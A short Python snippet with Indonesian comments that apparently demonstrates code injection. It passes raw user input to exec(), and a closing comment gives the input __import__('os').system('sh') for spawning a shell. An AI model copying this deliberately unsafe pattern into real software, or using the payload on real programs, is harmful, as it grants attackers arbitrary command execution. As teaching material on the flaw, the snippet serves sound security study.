inputAwal = input("Masukkan syntax python: ")
eksekusi = exec(inputAwal)

# masih sama, exec() memaksa input agar "one line only", yang dimana exec adalah digunakan untuk mengeksekusi syntax atau perintah program

# untuk mendapatkan shell, input: __import__('os').system('sh')